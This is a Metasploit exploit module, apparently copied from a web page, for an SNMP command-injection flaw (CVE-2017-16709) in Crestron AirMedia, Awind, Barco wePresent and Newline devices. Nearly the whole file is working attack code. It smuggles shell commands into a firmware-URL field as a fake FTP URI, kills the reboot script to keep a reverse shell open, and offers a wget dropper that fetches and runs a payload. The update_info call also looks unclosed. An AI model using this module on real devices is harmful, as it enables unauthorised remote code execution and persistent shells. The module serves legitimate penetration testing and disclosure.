# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::SNMPClient
  include Msf::Exploit::CmdStager

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "AwindInc SNMP Service Command Injection",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability found in AwindInc and OEM&#039;ed products where untrusted inputs are fed to ftpfw.sh system command, leading to command injection.
        A valid SNMP read-write community is required to exploit this vulnerability.

        The following devices are known to be affected by this issue:

          * Crestron Airmedia AM-100 <= version 1.5.0.4
          * Crestron Airmedia AM-101 <= version 2.5.0.12
          * Awind WiPG-1600w <= version 2.0.1.8
          * Awind WiPG-2000d <= version 2.1.6.2
          * Barco wePresent 2000 <= version 2.1.5.7
          * Newline Trucast 2 <= version 2.1.0.5
          * Newline Trucast 3 <= version 2.1.3.7
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Quentin Kaiser <kaiserquentin[at]gmail.com>&#039;
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2017-16709&#039;],
          [&#039;URL&#039;, &#039;https://github.com/QKaiser/awind-research&#039;],
          [&#039;URL&#039;, &#039;https://qkaiser.github.io/pentesting/2019/03/27/awind-device-vrd/&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;2019-03-27&#039;,
      &#039;Platform&#039;       => [&#039;unix&#039;, &#039;linux&#039;],
      &#039;Arch&#039;           => [ARCH_CMD, ARCH_ARMLE],
      &#039;Privileged&#039;     => true,
      &#039;Targets&#039;        => [
        [&#039;Unix In-Memory&#039;,
          &#039;Platform&#039;    => &#039;unix&#039;,
          &#039;Arch&#039;        => ARCH_CMD,
          &#039;Type&#039;        => :unix_memory,
          &#039;Payload&#039;     => {
            &#039;Compat&#039;    => {&#039;PayloadType&#039; => &#039;cmd&#039;, &#039;RequiredCmd&#039; => &#039;openssl&#039;}
          }
        ],
        [&#039;Linux Dropper&#039;,
          &#039;Platform&#039;    => &#039;linux&#039;,
          &#039;Arch&#039;        => ARCH_ARMLE,
          &#039;CmdStagerFlavor&#039; => %w[wget],
          &#039;Type&#039;        => :linux_dropper
        ]
      ],
      &#039;DefaultTarget&#039;  => 1,

    register_options(
      [
        OptString.new(&#039;COMMUNITY&#039;, [true, &#039;SNMP Community String&#039;, &#039;private&#039;]),
      ])
  end


  def check
    begin
      connect_snmp
      sys_description = snmp.get_value(&#039;1.3.6.1.2.1.1.1.0&#039;).to_s
      print_status("Target system is #{sys_description}")
      # AM-100 and AM-101 considered EOL, no fix so no need to check version.
      model = sys_description.scan(/Crestron Electronics (AM-100|AM-101)/).flatten.first
      case model
      when &#039;AM-100&#039;, &#039;AM-101&#039;
          return CheckCode::Vulnerable
      else
          # TODO: insert description check for other vulnerable models (that I don&#039;t have)
          # In the meantime, we return &#039;safe&#039;.
          return CheckCode::Safe
      end
    rescue SNMP::RequestTimeout
      print_error("#{ip} SNMP request timeout.")
    rescue Rex::ConnectionError
      print_error("#{ip} Connection refused.")
    rescue SNMP::UnsupportedVersion
      print_error("#{ip} Unsupported SNMP version specified. Select from &#039;1&#039; or &#039;2c&#039;.")
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("Unknown error: #{e.class} #{e}")
    ensure
      disconnect_snmp
    end
    Exploit::CheckCode::Unknown
  end

  def inject_payload(cmd)
    begin
      connect_snmp
      varbind = SNMP::VarBind.new([1,3,6,1,4,1,3212,100,3,2,9,1,0],SNMP::OctetString.new(cmd))
      resp = snmp.set(varbind)
      if resp.error_status == :noError
        print_status("Injection successful")
      else
        print_status("OID not writable or does not provide WRITE access with community &#039;#{datastore[&#039;COMMUNITY&#039;]}&#039;")
      end
    rescue SNMP::RequestTimeout
      print_error("#{ip} SNMP request timeout.")
    rescue Rex::ConnectionError
      print_error("#{ip} Connection refused.")
    rescue SNMP::UnsupportedVersion
      print_error("#{ip} Unsupported SNMP version specified. Select from &#039;1&#039; or &#039;2c&#039;.")
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("Unknown error: #{e.class} #{e}")
    ensure
      disconnect_snmp
    end
  end

  def trigger
    begin
      connect_snmp
      varbind = SNMP::VarBind.new([1,3,6,1,4,1,3212,100,3,2,9,5,0],SNMP::Integer32.new(1))
      resp = snmp.set(varbind)
      if resp.error_status == :noError
        print_status("Trigger successful")
      else
        print_status("OID not writable or does not provide WRITE access with community &#039;#{datastore[&#039;COMMUNITY&#039;]}&#039;")
      end
    rescue SNMP::RequestTimeout
      print_error("#{ip} SNMP request timeout.")
    rescue Rex::ConnectionError
      print_error("#{ip} Connection refused.")
    rescue SNMP::UnsupportedVersion
      print_error("#{ip} Unsupported SNMP version specified. Select from &#039;1&#039; or &#039;2c&#039;.")
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("Unknown error: #{e.class} #{e}")
    ensure
      disconnect_snmp
    end
  end

  def exploit
    case target[&#039;Type&#039;]
    when :unix_memory
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end
  end

  def execute_command(cmd, opts = {})
    # The payload must start with a valid FTP URI otherwise the injection point is not reached
    cmd = "ftp://1.1.1.1/$(#{cmd.to_s})"

    # When the FTP download fails, the script calls /etc/reboot.sh and we loose the callback
    # We therefore kill /etc/reboot.sh before it reaches /sbin/reboot with that command and
    # keep our reverse shell opened :)
    cmd << "$(pkill -f /etc/reboot.sh)"

    # the MIB states that camFWUpgradeFTPURL must be 255 bytes long so we pad
    cmd << "A" * (255-cmd.length)

    # we inject our payload in camFWUpgradeFTPURL
    print_status("Injecting payload")
    inject_payload(cmd)

    # we trigger the firmware download via FTP, which will end up calling this
    # "/bin/getRemoteURL.sh %s %s %s %d"
    print_status("Triggering call")
    trigger
  end
end

